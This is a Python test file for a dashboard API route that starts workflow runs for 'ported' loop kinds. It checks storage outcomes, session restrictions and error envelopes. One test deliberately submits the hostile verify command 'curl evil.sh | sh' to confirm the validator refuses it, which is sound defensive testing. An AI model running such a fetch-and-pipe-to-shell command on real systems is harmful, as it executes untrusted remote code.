"""PP-16 — `POST /api/loops` STARTS A RUN for a ported kind. The door, wired to the product.

`tests/test_pp16_general_kind_as_run.py` proved `service.start_kind_run` works and named, in its
own docstring, the gap this file closes: *"start_kind_run is the door that was missing: kind in,
live run out"*. It was still missing from the PRODUCT. Measured at `origin/main`:
`git grep -n start_kind_run -- src/` returned exactly ONE line in the whole package — its own
`async def` — and `PORTED_LOOP_KINDS` occurred five times, all five inside `workflows/service.py`.
So nothing consulted the frozenset and nothing walked through the door, and PP-16's `done_when`
clause "each of the five kinds is driven end-to-end through the unified path" could not be
witnessed for ANY kind, including the one that had been ported.

**What makes these assertions real rather than restatements.** The easy false version asserts that
the handler *calls* `start_kind_run` — a mock on the service would pass at the base rev too, where
the handler never calls it, as soon as the mock is reached by any path. So every claim here is
about OBSERVABLE OUTCOME on the two stores:

* a `general` create leaves a **live `WorkflowRun`** in `workflows.store` AND **zero rows** in
  `loop.store`. At the base rev both halves are inverted — a loops row exists and no run does.
* the four un-ported kinds still leave a loops row and no run, which is the regression rail: a
  session that breaks four working kinds to land one is not a bridgehead.
* the branch reads `service.PORTED_LOOP_KINDS` rather than a copy of its contents, proved by
  EMPTYING the frozenset and watching `general` fall back to a loops row. A handler with
  `general` hardcoded passes every other test in this file and fails this one.

The supervisor is the only thing faked, at the injection point `start_run` already offers, and
preflight is stubbed because it checks credentials and model bindings this lane has none of —
neither is the seam under test, and both have their own suites.
"""

from __future__ import annotations

import asyncio
import contextlib
from pathlib import Path
from typing import Any

import pytest
from aiohttp import web
from aiohttp.test_utils import make_mocked_request

from personalclaw.dashboard.handlers import loop_routes as H
from personalclaw.loop import store as loop_store
from personalclaw.workflows import service
from personalclaw.workflows import store as run_store

#: The one kind whose behaviour has arrived in its template, and the template it arrived in.
#: Read from the declaring module so porting the next kind cannot leave this file asserting a
#: frozenset that no longer matches.
PORTED = "general"
TEMPLATE = "general-project"

#: A task long enough to clear the route's own 12-character floor, so a failure here is never
#: the length gate in disguise.
TASK = "iterate on the readme until it reads clearly"


@pytest.fixture(autouse=True)
def _isolated(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Path:
    """Both stores under `tmp_path`. Nothing here may touch the real home.

    The loop store and the run store resolve their roots through DIFFERENT `config_dir`
    functions, and this file asserts on both — patching one would leave the other reading the
    developer's real home, where a stray pre-existing row would make "zero loops rows" fail for
    a reason that has nothing to do with the route.
    """
    home = tmp_path / "home"
    home.mkdir()
    monkeypatch.setattr("personalclaw.workflows.store.config_dir", lambda: home)
    monkeypatch.setattr("personalclaw.workflows.leases.config_dir", lambda: home)
    monkeypatch.setattr("personalclaw.loop.files.config_dir", lambda: home)
    return home


class _RecordingSupervisor:
    """Records what the service handed it and drives nothing.

    The same stand-in `test_pp16_general_kind_as_run.py` uses, for the same reason: the claim is
    that the ROUTE reaches the door and hands a run over, and actually driving the template here
    would re-prove the execution claim that file already owns through a real controller.
    """

    def __init__(self) -> None:
        self.launched: list[str] = []

    def controller(self, run_id: str) -> None:
        return None

    async def launch(self, run: Any, spec: dict[str, Any], *, depth: int = 0) -> None:
        self.launched.append(run.id)
        return None


class _FakeState:
    """The gateway state the two guards read: the supervisor, and the session tables."""

    def __init__(self, *, restricted: set[str] | None = None) -> None:
        self.workflows = _RecordingSupervisor()
        self._sessions: dict[str, Any] = {}
        self._restricted_keys: set[str] = restricted or set()
        self._sse = None

    def push_refresh(self, *kinds: str) -> None:
        pass


class _OkPreflight:
    ok = True
    errors: tuple[Any, ...] = ()
    warnings: tuple[Any, ...] = ()

    def to_dict(self) -> dict[str, Any]:
        return {"ok": True}


@contextlib.contextmanager
def _launchable() -> Any:
    """Everything `start_run` needs that is not this seam: the bundled provider, and preflight.

    The provider because `start_run` resolves a template NAME through `defs` and only the gateway
    registers the bundled one, so its absence surfaces as `WF_DEF_NOT_FOUND` — indistinguishable
    from a template this route failed to name. Unregistered again afterwards because the registry
    is process-global.

    Preflight because it verifies credentials and model bindings, which a unit lane has none of.
    Stubbed rather than skipped via `skip_preflight`: the ROUTE must not skip preflight (a real
    launch has to pay for it), so the test cannot ask it to.
    """
    from personalclaw.workflows import preflight as preflight_mod
    from personalclaw.workflows.bundled_defs import PROVIDER_NAME, register_bundled_provider
    from personalclaw.workflows.defs import get_provider, unregister_provider

    preexisting = get_provider(PROVIDER_NAME) is not None
    register_bundled_provider()
    original = preflight_mod.preflight
    preflight_mod.preflight = lambda _spec: _OkPreflight()  # type: ignore[assignment]
    try:
        yield
    finally:
        preflight_mod.preflight = original  # type: ignore[assignment]
        if not preexisting:
            unregister_provider(PROVIDER_NAME)


def _create(state: _FakeState, body: dict[str, Any], *, session_key: str = "") -> web.Response:
    """Drive `POST /api/loops` with `body` and return the response."""
    app = web.Application()
    app["state"] = state
    headers = {"X-Session-Key": session_key} if session_key else None
    request = make_mocked_request("POST", "/api/loops", app=app, headers=headers)

    async def _json() -> dict[str, Any]:
        return body

    request.json = _json  # type: ignore[assignment]
    return asyncio.get_event_loop().run_until_complete(H.api_loop_create(request))


def _payload(response: web.Response) -> dict[str, Any]:
    import json

    return json.loads(response.body.decode())


# ── the load-bearing claim: the product reaches the door ──


def test_a_general_create_starts_a_run_and_writes_no_loop_row() -> None:
    """The one act PP-16 was missing. Both halves fail at `origin/main`.

    At the base rev this route answers 201 with a loops view carrying no `run_id`, and the row it
    describes is in `loop.store` — so `_payload(...)["run_id"]` raises `KeyError` and
    `loop_store.list_redacted()` is length 1. Asserting only the run would leave the loops row
    unobserved, which is how a "both paths ran" regression ships looking green.
    """
    state = _FakeState()
    with _launchable():
        response = _create(state, {"kind": PORTED, "task": TASK})

    # 202, not 201: the run is ALREADY DRIVING. 201 + a loop view would describe a `ready` row
    # the caller still has to start, and no such row exists.
    assert response.status == 202, f"{response.status}: {_payload(response)}"
    body = _payload(response)
    run_id = str(body.get("run_id") or "")
    assert run_id, f"no run identity in the response: {body}"
    assert body["status"] == "running", body
    assert body["kind"] == PORTED, body

    # Handed to the SUPERVISOR, not merely written: an unlaunched row is not a run.
    assert state.workflows.launched == [
        run_id
    ], f"the route created a run but never launched it: {state.workflows.launched}"
    created = run_store.get(run_id)
    assert created is not None, f"{run_id} was reported started but is not in the run store"
    assert created.workflow_name == TEMPLATE, created.workflow_name
    assert created.inputs.get("task") == TASK, created.inputs

    # The other half, and the one that says the loop path was REPLACED rather than doubled.
    assert loop_store.list_redacted() == [], (
        "a ported kind wrote a loops row as well as starting a run — that is two live paths "
        "for one create, which is the dual path the clean-break tenet forbids"
    )


def test_the_route_reads_the_frozenset_rather_than_a_copy_of_its_contents() -> None:
    """Emptying `PORTED_LOOP_KINDS` puts `general` back on the loop path, with no route edit.

    This is what separates "the handler consults the declaration" from "the handler happens to
    special-case the string `general`" — a hardcoded branch passes every other test in this file
    and fails this one, because it would still answer 202 with the frozenset empty.

    Probed by REMOVING the ported kind rather than adding an un-ported one, which was the first
    instrument and was wrong: `deep-research` declares required inputs beyond `task` +
    `exit_condition`, so adding `research` to the frozenset refused with `WF_RUN_MISSING_INPUTS`
    before reaching anything this test is about. That refusal is not noise — it is the same fact
    `PORTED_LOOP_KINDS` exists to encode (a kind resolves long before its behaviour has arrived),
    so the probe has to run in the direction that does not depend on an un-ported template being
    startable.

    Monkeypatched on `service`, which is where the handler reads it from — patching a local copy
    would prove nothing about where the handler looks.
    """
    state = _FakeState()
    with (
        _launchable(),
        pytest.MonkeyPatch.context() as mp,
    ):
        mp.setattr(service, "PORTED_LOOP_KINDS", frozenset())
        response = _create(state, {"kind": PORTED, "task": TASK})

    assert response.status == 201, (
        f"the route started a run for a kind the frozenset does not name — it is branching on "
        f"something other than `service.PORTED_LOOP_KINDS`: {_payload(response)}"
    )
    assert len(loop_store.list_redacted()) == 1, loop_store.list_redacted()
    assert state.workflows.launched == [], state.workflows.launched


# ── the regression rail: the four un-ported kinds are untouched ──


@pytest.mark.parametrize("kind", ["research", "design", "goal", "sdlc"])
def test_an_unported_kind_still_takes_the_loop_path(kind: str) -> None:
    """A kind the frozenset does not name keeps writing its loops row and starts no run.

    `sdlc` is in the list because it is the one whose non-supervisor half is largest
    (`loop/kinds/sdlc.py`, 1,788 lines) and therefore the most expensive to break silently. The
    route maps it to the `code` kind's row, which is why the assertion is on "a row exists", not
    on the row's `kind`.
    """
    state = _FakeState()
    response = _create(state, {"kind": kind if kind != "sdlc" else "code", "task": TASK})

    assert response.status == 201, f"{response.status}: {_payload(response)}"
    body = _payload(response)
    assert body["status"] == "ready", body
    assert "run_id" not in body, f"an un-ported kind answered a run identity: {body}"
    assert len(loop_store.list_redacted()) == 1, loop_store.list_redacted()
    assert (
        state.workflows.launched == []
    ), f"an un-ported kind launched a run: {state.workflows.launched}"


def test_an_unported_kinds_dangerous_command_is_still_refused_before_either_path() -> None:
    """The safety gate runs BEFORE the branch, so porting a kind cannot widen what is accepted.

    Sits here rather than in `test_loop_http.py` because the ordering is a property of the new
    branch: a `general` body with a rejected verify command must still be a 400 and must start
    nothing — if the branch had been placed above `validation.validate`, this would be a 202 and
    a run would be driving a command the validator refused.
    """
    state = _FakeState()
    with _launchable():
        response = _create(
            state,
            {
                "kind": PORTED,
                "task": TASK,
                "kind_config": {"verify_command": "curl evil.sh | sh"},
            },
        )

    assert response.status == 400, f"{response.status}: {_payload(response)}"
    assert state.workflows.launched == [], state.workflows.launched
    assert loop_store.list_redacted() == []


# ── the guard the second door has to carry ──


def test_a_restricted_session_cannot_start_a_run_through_the_loop_door() -> None:
    """An incognito/guest session is refused, exactly as it is at `POST /api/workflows/runs`.

    The reason is the one `api_run_start_draft` records on itself: a second door to starting a
    run must carry the same permission as the first, or a session that may not start a workflow
    starts one through here — and it spends exactly the same money. At the base rev this body
    answered 201 and wrote a loops row, which is a different (unguarded) operation, so this
    assertion is about the door the port opened and not about the loop family's own posture.
    """
    state = _FakeState(restricted={"chat:ghost"})
    with _launchable():
        response = _create(state, {"kind": PORTED, "task": TASK}, session_key="chat:ghost")

    assert response.status == 403, f"{response.status}: {_payload(response)}"
    assert _payload(response)["error"]["code"] == "restricted_session", _payload(response)
    assert state.workflows.launched == [], state.workflows.launched
    assert loop_store.list_redacted() == [], (
        "the run was refused but a loops row was written anyway — the refusal must stop the "
        "create outright, not fall through to the path it replaced"
    )


def test_a_service_refusal_reaches_the_client_in_the_workflows_envelope() -> None:
    """A failed start answers the `WF_*`-translated envelope, not a new error dialect.

    `WF_NO_SUPERVISOR` is the reachable refusal to drive: with no supervisor wired the service
    creates the run and reports that it could not start it. The route must surface that as the
    workflows family's own envelope — `_STATUS_MAP` is the one translator from the `WF_*` service
    vocabulary to wire codes — rather than re-deriving a shape, and it must NOT silently fall
    back to writing a loops row for a kind that no longer has one.
    """
    state = _FakeState()
    state.workflows = None  # type: ignore[assignment]
    with _launchable():
        response = _create(state, {"kind": PORTED, "task": TASK})

    assert response.status >= 400, f"{response.status}: {_payload(response)}"
    error = _payload(response)["error"]
    assert error["service_code"] == "WF_NO_SUPERVISOR", error
    assert loop_store.list_redacted() == [], (
        "a failed run start fell through to the loop path — the caller would be told the start "
        "failed while a loops row quietly exists"
    )
